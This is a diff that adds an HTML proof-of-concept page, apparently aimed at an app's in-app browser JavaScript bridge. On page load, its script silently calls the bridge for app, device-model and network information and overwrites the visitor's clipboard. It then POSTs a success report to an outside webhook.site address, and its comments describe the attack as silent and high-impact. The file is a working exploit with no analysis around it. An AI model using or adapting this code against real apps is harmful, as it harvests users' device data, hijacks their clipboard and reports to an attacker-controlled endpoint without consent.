@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Internal Bridge Test</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <h3>Ghost Bridge Impact</h3>
+    <div id="status">Monitoring Bridge...</div>
+
+    <script>
+        const webhook = "https://webhook.site/ccc5a516-132a-4a1b-9d20-dc323e820bd3";
+
+        async function triggerImpact() {
+            if (window.iabjs_unified_bridge) {
+                // Scenario: Stealing Device Specs silently via Bridge
+                // In commands pe aksar alert nahi aata
+                const payloads = [
+                    {"action": "get_app_info"},
+                    {"action": "get_device_model"},
+                    {"action": "get_network_info"}
+                ];
+
+                payloads.forEach(p => {
+                    window.iabjs_unified_bridge.postMessage(JSON.stringify(p));
+                });
+
+                // Clipboard overwrite - Silent and High Impact
+                await navigator.clipboard.writeText("CRITICAL_IMPACT_EXPLOIT_RUNNING");
+                
+                // POSTing the success to your webhook
+                fetch(webhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        status: "Exploit_Executed_Silently",
+                        bridge_active: true,
+                        clipboard: "Hijacked"
+                    })
+                });
+                document.getElementById('status').innerText = "Impact Executed. Check Webhook.";
+            }
+        }
+        
+        window.onload = triggerImpact;
+    </script>
+</body>
+</html>
